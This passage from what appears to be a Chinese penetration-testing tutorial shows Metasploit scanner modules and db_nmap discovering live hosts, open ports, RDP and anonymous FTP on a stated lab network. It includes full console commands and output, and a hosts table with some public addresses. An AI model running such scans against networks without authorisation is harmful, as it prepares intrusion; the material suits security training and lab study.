PORTS <span class="token number">22</span>‐<span class="token number">25</span> yes Ports to scan <span class="token punctuation">(</span>e<span class="token punctuation">.</span>g<span class="token punctuation">.</span> <span class="token number">22</span>‐<span class="token number">25</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">110</span>‐<span class="token number">900</span><span class="token punctuation">)</span>
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> yes The target address range or CIDR identifier
THREADS <span class="token number">50</span> yes The number of concurrent threads 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ftpbounce<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">21</span> ‐ TCP OPEN <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">22</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">21</span> ‐ TCP OPEN <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">23</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">21</span> ‐ TCP OPEN <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">24</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">21</span> ‐ TCP OPEN <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">25</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">21</span> ‐ Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224103928.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>18、基于auxiliary/scanner/portscan/xmas发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>xmas<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>xmas<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
BATCHSIZE <span class="token number">256</span> yes The number of hosts to scan per set
DELAY <span class="token number">0</span> yes The delay between connections<span class="token punctuation">,</span> per thread<span class="token punctuation">,</span> in millisecond s
INTERFACE no The name of the interface
JITTER <span class="token number">0</span> yes The delay jitter factor <span class="token punctuation">(</span>maximum value by which to <span class="token operator">+</span><span class="token operator">/</span>‐ DELAY<span class="token punctuation">)</span> in milliseconds<span class="token punctuation">.</span>
PORTS <span class="token number">80</span> yes Ports to scan <span class="token punctuation">(</span>e<span class="token punctuation">.</span>g<span class="token punctuation">.</span> <span class="token number">22</span>‐<span class="token number">25</span><span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">,</span><span class="token number">110</span>‐<span class="token number">900</span><span class="token punctuation">)</span>
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span> yes The target address range or CIDR identifier
SNAPLEN <span class="token number">65535</span> yes The number of bytes to capture
THREADS <span class="token number">50</span> yes The number of concurrent threads
TIMEOUT <span class="token number">500</span> yes The reply read timeout in milliseconds 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>xmas<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224128192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>19、基于auxiliary/scanner/rdp/rdp_scanner发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>rdp_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>rdp_scanner<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
CredSSP true yes Whether or not to request CredSSP
EarlyUser false yes Whether to support Earlier User Authorization Result PDU
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.2</span><span class="token punctuation">,</span><span class="token number">115</span><span class="token punctuation">,</span><span class="token number">119</span> yes The target address range or CIDR identifier
RPORT <span class="token number">3389</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
THREADS <span class="token number">50</span> yes The number of concurrent threads
TLS true yes Wheter or not request TLS security 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>rdp_scanner<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">1</span> of <span class="token number">3</span> hosts <span class="token punctuation">(</span><span class="token number">33</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">:</span><span class="token number">3389</span> ‐ Identified RDP
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">2</span> of <span class="token number">3</span> hosts <span class="token punctuation">(</span><span class="token number">66</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">3389</span> ‐ Identified RDP
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">3</span> of <span class="token number">3</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224149733.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>20、基于auxiliary/scanner/smtp/smtp_version发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>smtp<span class="token operator">/</span>smtp_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smtp<span class="token operator">/</span>smtp_version<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> yes The target address range or CIDR identifier
RPORT <span class="token number">25</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
THREADS <span class="token number">50</span> yes The number of concurrent threads

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>smtp<span class="token operator">/</span>smtp_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224211275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>micro8<span class="token punctuation">.</span>gitbook<span class="token punctuation">.</span>io<span class="token operator">/</span>micro8<span class="token operator">/</span>contents<span class="token operator">-</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">21</span><span class="token operator">-</span><span class="token number">30</span><span class="token operator">/</span><span class="token number">26</span><span class="token operator">-</span>ji<span class="token operator">-</span>yu<span class="token operator">-</span>msf<span class="token operator">-</span>fa<span class="token operator">-</span>xian<span class="token operator">-</span>nei<span class="token operator">-</span>wang<span class="token operator">-</span>cun<span class="token operator">-</span>huo<span class="token operator">-</span>zhu<span class="token operator">-</span>ji<span class="token operator">-</span>di<span class="token operator">-</span>si<span class="token operator">-</span>ji
</code></pre>
<hr>
<h2><a id="545_MSF5_2476"></a>5.4.5 基于MSF发现内网存活主机（5）</h2>
<p>攻击机：<br>
192.168.1.102 Debian</p>
<p>靶机：<br>
192.168.1.2 Windows 7<br>
192.168.1.115 Windows 2003<br>
192.168.1.119 Windows 2003</p>
<p>（1）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>arp_sweep 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_sweep
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>ftp_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>http_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_version
</code></pre>
<p>（2）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ssh<span class="token operator">/</span>ssh_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>telnet<span class="token operator">/</span>telnet_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>discovery<span class="token operator">/</span>udp_probe 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>dns<span class="token operator">/</span>dns_amp
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>mysql<span class="token operator">/</span>mysql_version
</code></pre>
<p>（3）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>netbios<span class="token operator">/</span>nbname 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>http<span class="token operator">/</span>title
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>db2<span class="token operator">/</span>db2_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ack
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>tcp
</code></pre>
<p>（4）主要介绍scanner下的五个模块，辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>syn 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>ftpbounce
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>portscan<span class="token operator">/</span>xmas 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>rdp_scanner
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smtp<span class="token operator">/</span>smtp_version
</code></pre>
<p>（5）主要介绍scanner下的三个模块，以及db_nmap辅助发现内网存活主机，分别为：</p>
<pre><code class="prism language-c">auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>pop3<span class="token operator">/</span>pop3_version
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>postgres<span class="token operator">/</span>postgres_version 
auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>anonymous
db_nmap
</code></pre>
<p><strong>21、基于auxiliary/scanner/pop3/pop3_version发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>pop3<span class="token operator">/</span>pop3_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>pop3<span class="token operator">/</span>pop3_version<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.110</span>‐<span class="token number">120</span> yes The target address range or CIDR identifier
RPORT <span class="token number">110</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
THREADS <span class="token number">50</span> yes The number of concurrent threads 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>pop3<span class="token operator">/</span>pop3_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">5</span> of <span class="token number">11</span> hosts <span class="token punctuation">(</span><span class="token number">45</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">11</span> of <span class="token number">11</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224415665.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>22、基于auxiliary/scanner/postgres/postgres_version发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>postgres<span class="token operator">/</span>postgres_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>postgres<span class="token operator">/</span>postgres_version<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
DATABASE template1 yes The database to authenticate against
PASSWORD msf no The password <span class="token keyword">for</span> the specified username<span class="token punctuation">.</span> Leave blank <span class="token keyword">for</span> a random password<span class="token punctuation">.</span>
RHOSTS <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> yes The target address range or CIDR identifier
RPORT <span class="token number">5432</span> yes The target port
THREADS <span class="token number">50</span> yes The number of concurrent threads
USERNAME msf yes The username to authenticate as
VERBOSE false no Enable verbose output 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>postgres<span class="token operator">/</span>postgres_version<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">:</span><span class="token number">5432</span> Postgres ‐ Version PostgreSQL <span class="token number">9.6</span><span class="token number">.6</span> on x86_64‐pc‐li
nux‐gnu<span class="token punctuation">,</span> compiled by gcc <span class="token punctuation">(</span>Debian <span class="token number">4.9</span><span class="token number">.2</span>‐<span class="token number">10</span><span class="token punctuation">)</span> <span class="token number">4.9</span><span class="token number">.2</span><span class="token punctuation">,</span> <span class="token number">64</span>‐bit <span class="token punctuation">(</span>Post‐Auth<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">1</span> of <span class="token number">1</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/2020100222444133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>23、基于auxiliary/scanner/ftp/anonymous发现内网存活主机</strong></p>
<pre><code class="prism language-c">msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>anonymous<span class="token punctuation">)</span> <span class="token operator">&gt;</span> show options 

Module options <span class="token punctuation">(</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>anonymous<span class="token punctuation">)</span><span class="token punctuation">:</span> 

Name Current Setting Required Description
‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐
FTPPASS mozilla@example<span class="token punctuation">.</span>com no The password <span class="token keyword">for</span> the specified username
FTPUSER anonymous no The username to authenticate as
RHOSTS <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.100</span>‐<span class="token number">120</span> yes The target address range or CIDR identifier
RPORT <span class="token number">21</span> yes The target port <span class="token punctuation">(</span>TCP<span class="token punctuation">)</span>
THREADS <span class="token number">50</span> yes The number of concurrent threads 

msf <span class="token function">auxiliary</span><span class="token punctuation">(</span>scanner<span class="token operator">/</span>ftp<span class="token operator">/</span>anonymous<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit 

<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">:</span><span class="token number">21</span> ‐ <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span><span class="token punctuation">:</span><span class="token number">21</span> ‐ Anonymous READ <span class="token punctuation">(</span><span class="token number">220</span> Slyar Ftpserver<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">21</span> ‐ <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span><span class="token punctuation">:</span><span class="token number">21</span> ‐ Anonymous READ <span class="token punctuation">(</span><span class="token number">220</span> FTPserver<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">3</span> of <span class="token number">21</span> hosts <span class="token punctuation">(</span><span class="token number">14</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">6</span> of <span class="token number">21</span> hosts <span class="token punctuation">(</span><span class="token number">28</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">17</span> of <span class="token number">21</span> hosts <span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Scanned <span class="token number">21</span> of <span class="token number">21</span> hosts <span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">%</span> complete<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224502526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>24、基于db_nmap发现内网存活主机</strong><br>
MSF内置强大的端口扫描工具Nmap，为了更好的区别，内置命令为：db_nmap，并且会自动存储nmap扫描结果到数据库中，方便快速查询已知存活主机，以及更快捷的进行团队协同作战，使用方法与nmap一致。也是在实战中最常用到的发现内网存活主机方式之一</p>
<p>例：</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> db_nmap ‐p <span class="token number">445</span> ‐T4 ‐sT <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span>‐<span class="token number">120</span>
‐‐open
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> Starting Nmap <span class="token number">7.70</span> <span class="token punctuation">(</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>nmap<span class="token punctuation">.</span>org <span class="token punctuation">)</span> at <span class="token number">2019</span>‐<span class="token number">02</span>‐<span class="token number">17</span> <span class="token number">15</span><span class="token punctuation">:</span><span class="token number">17</span> EST
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.115</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> Host is up <span class="token punctuation">(</span><span class="token number">0.0025</span>s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> PORT STATE SERVICE
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> <span class="token number">445</span><span class="token operator">/</span>tcp open microsoft‐ds
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> MAC Address<span class="token punctuation">:</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>C<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span>AF<span class="token punctuation">:</span>CE<span class="token punctuation">:</span>CC <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.119</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> Host is up <span class="token punctuation">(</span><span class="token number">0.0026</span>s latency<span class="token punctuation">)</span><span class="token punctuation">.</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> PORT STATE SERVICE
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> <span class="token number">445</span><span class="token operator">/</span>tcp open microsoft‐ds
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> MAC Address<span class="token punctuation">:</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">0</span>C<span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">:</span><span class="token number">85</span><span class="token punctuation">:</span>D6<span class="token punctuation">:</span><span class="token number">7</span>D <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Nmap<span class="token punctuation">:</span> Nmap done<span class="token punctuation">:</span> <span class="token number">6</span> IP addresses <span class="token punctuation">(</span><span class="token number">2</span> hosts up<span class="token punctuation">)</span> scanned in <span class="token number">13.35</span> seconds
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201002224539476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
命令hosts查看数据库中已发现的内网存活主机</p>
<pre><code class="prism language-c">msf <span class="token function">exploit</span><span class="token punctuation">(</span>multi<span class="token operator">/</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> hosts 

Hosts
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> 

address mac name os_name os_flavor os_sp purpose info comments
‐‐‐‐‐‐‐ ‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐ ‐‐‐‐‐‐‐ ‐‐‐‐ ‐‐‐‐‐‐‐‐
<span class="token number">1.34</span><span class="token number">.37</span><span class="token number">.188</span> firewall
<span class="token number">10.0</span><span class="token number">.0</span><span class="token number">.2</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">1</span>d<span class="token punctuation">:</span>dc<span class="token punctuation">:</span><span class="token number">3</span>b<span class="token punctuation">:</span><span class="token number">16</span>
<span class="token number">10.0</span><span class="token number">.0</span><span class="token number">.3</span> <span class="token number">00</span><span class="token punctuation">:</span>e0<span class="token punctuation">:</span><span class="token number">81</span><span class="token punctuation">:</span>bf<span class="token punctuation">:</span>b9<span class="token punctuation">:</span><span class="token number">7</span>b
<span class="token number">10.0</span><span class="token number">.0</span><span class="token number">.4</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">30</span><span class="token punctuation">:</span><span class="token number">6</span>e<span class="token punctuation">:</span>ca<span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span>b8
<span class="token number">10.0</span><span class="token number">.0</span><span class="token number">.5</span> <span class="token number">9</span>c<span class="token punctuation">:</span><span class="token number">8</span>e<span class="token punctuation">:</span><span class="token number">99</span><span class="token punctuation">:</span>c4<span class="token punctuation">:</span><span class="token number">63</span><span class="token punctuation">:</span><span class="token number">74</span> <span class="token number">2013</span>XXXXX Windows <span class="token number">2008</span> SP1 client
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token number">10.0</span><span class="token number">.0</span><span class="token number">.242</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">57</span><span class="token punctuation">:</span><span class="token number">01</span><span class="token punctuation">:</span>d4<span class="token punctuation">:</span><span class="token number">71</span>
<span class="token number">10.0</span><span class="token number">.0</span><span class="token number">.243</span> <span class="token number">00</span><span class="token punctuation">:</span><span class="token number">13</span><span class="token punctuation">:</span><span class="token number">57</span><span class="token punctuation">:</span><span class="token number">01</span><span class="token punctuation">:</span>d4<span class="token punctuation">:</span><span class="token number">73</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token number">10.162</span><span class="token number">.110</span><span class="token number">.30</span> firewall
<span class="token number">59.125</span><span class="token number">.110</span><span class="token number">.178</span> firewall
<span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> Unknown device
<span class="token number">172.16</span><span class="token number">.204</span><span class="token number">.8</span> WIN‐<span class="token number">6F</span>EAACQJ691 Windows <span class="token number">2012</span> server
<span class="token number">172.16</span><span class="token number">.204</span><span class="token number">.9</span> WIN‐<span class="token number">6F</span>EAACQJ691 Windows <span class="token number">2012</span> server
<span class="token number">172.16</span><span class="token number">.204</span><span class="token number">.21</span> IDS Windows <span class="token number">2003</span> SP2 server
<span class="token number">192.168</span><span class="token number">.1</span><span class="token number">.5</span> JOHN‐PC Windows <span class="token number">7</span> SP1 client
